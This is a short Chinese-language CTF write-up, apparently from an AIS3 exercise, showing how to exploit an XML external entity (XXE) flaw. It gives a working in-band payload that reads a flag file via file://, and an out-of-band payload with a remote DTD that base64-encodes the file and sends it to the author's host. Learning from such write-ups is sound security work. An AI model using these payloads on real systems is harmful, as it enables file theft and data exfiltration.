# XXE with SSRF
這是AIS3 Orange大大給基礎題：  
題目給了一個大大的`xml here`輸入框，看就知道是XXE  
隨便輸入個xml就能夠被解析輸出  
這邊測試看看回顯以及不回顯該怎麼做

# 回顯
我要的是網站根目錄下的`flag`  
```xml
<!DOCTYPE ANY [
<!ENTITY file SYSTEM "file:///var/www/html/flag">]>
<root>
<msg>&file;</msg>
</root>
```
外部實體＋偽協議輕輕鬆鬆拿到了flag：  
```xml
   SimpleXMLElement Object
(
    [msg] => SimpleXMLElement Object
        (
            [file] => SimpleXMLElement Object
                (
                    [file] => ais3{this is your first flag}

                )

        )
```

# 非回顯
如果沒有顯示框的話，就請把`flag`送來我家吧  
```xml
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % remote SYSTEM "http://pwnch.tw/xxe.dtd">
%remote;
%all;
%send;
]>
```
參考[kaibro payload](https://github.com/w181496/Web-CTF-Cheatsheet#out-of-band-oob-xxe) 發現用base64編碼過比較好，不然會出現`simplexml_load_string()`吃到非法字元的問題。  
`xxe.dtd`  
```xml
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://pwnch.tw/?a=%file;'>">
```
接著用`index.php`把`$_GET['a']`接回來即可
